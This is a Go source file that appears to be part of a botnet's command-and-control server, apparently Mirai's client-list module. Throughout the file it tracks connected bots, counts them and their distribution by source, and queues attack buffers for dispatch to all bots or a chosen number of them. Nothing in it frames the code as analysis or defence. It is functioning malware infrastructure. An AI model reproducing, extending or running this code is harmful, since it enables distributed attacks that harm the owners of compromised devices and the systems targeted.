package main

import (
	"fmt"
	"sync"
)

type AttackSend struct {
	buf     []byte
	count   int
	botCata string
}

type ClientList struct {
	uid         int
	count       int
	clients     map[int]*Bot
	addQueue    chan *Bot
	delQueue    chan *Bot
	atkQueue    chan *AttackSend
	totalCount  chan int
	cntView     chan int
	distViewReq chan int
	distViewRes chan map[string]int
	cntMutex    *sync.Mutex
}

func NewClientList() *ClientList {
	c := &ClientList{0, 0, make(map[int]*Bot), make(chan *Bot, 128), make(chan *Bot, 128), make(chan *AttackSend), make(chan int, 64), make(chan int), make(chan int), make(chan map[string]int), &sync.Mutex{}}
	go c.worker()
	go c.fastCountWorker()
	return c
}

func (cl *ClientList) Count() int {
	cl.cntMutex.Lock()
	defer cl.cntMutex.Unlock()

	cl.cntView <- 0
	return <-cl.cntView
}

func (cl *ClientList) Distribution() map[string]int {
	cl.cntMutex.Lock()
	defer cl.cntMutex.Unlock()
	cl.distViewReq <- 0
	return <-cl.distViewRes
}

func (cl *ClientList) AddClient(c *Bot) {
	cl.addQueue <- c
	fmt.Printf("Added %d - %s - %s\n", c.version, c.source, c.conn.RemoteAddr())
}

func (cl *ClientList) DelClient(c *Bot) {
	cl.delQueue <- c
	fmt.Printf("Deleted %d - %s - %s\n", c.version, c.source, c.conn.RemoteAddr())
}

func (cl *ClientList) QueueBuf(buf []byte, maxbots int, botCata string) {
	attack := &AttackSend{buf, maxbots, botCata}
	cl.atkQueue <- attack
}

func (cl *ClientList) fastCountWorker() {
	for {
		select {
		case delta := <-cl.totalCount:
			cl.count += delta
			break
		case <-cl.cntView:
			cl.cntView <- cl.count
			break
		}
	}
}

func (cl *ClientList) worker() {
	for {
		select {
		case add := <-cl.addQueue:
			cl.totalCount <- 1
			cl.uid++
			add.uid = cl.uid
			cl.clients[add.uid] = add
			break
		case del := <-cl.delQueue:
			cl.totalCount <- -1
			delete(cl.clients, del.uid)
			break
		case atk := <-cl.atkQueue:
			if atk.count == -1 {
				for _, v := range cl.clients {
					if atk.botCata == "" || atk.botCata == v.source {
						v.QueueBuf(atk.buf)
					}
				}
			} else {
				var count int
				for _, v := range cl.clients {
					if count > atk.count {
						break
					}
					if atk.botCata == "" || atk.botCata == v.source {
						v.QueueBuf(atk.buf)
						count++
					}
				}
			}
			break
		case <-cl.cntView:
			cl.cntView <- cl.count
			break
		case <-cl.distViewReq:
			res := make(map[string]int)
			for _, v := range cl.clients {
				if ok, _ := res[v.source]; ok > 0 {
					res[v.source]++
				} else {
					res[v.source] = 1
				}
			}
			cl.distViewRes <- res
		}
	}
}
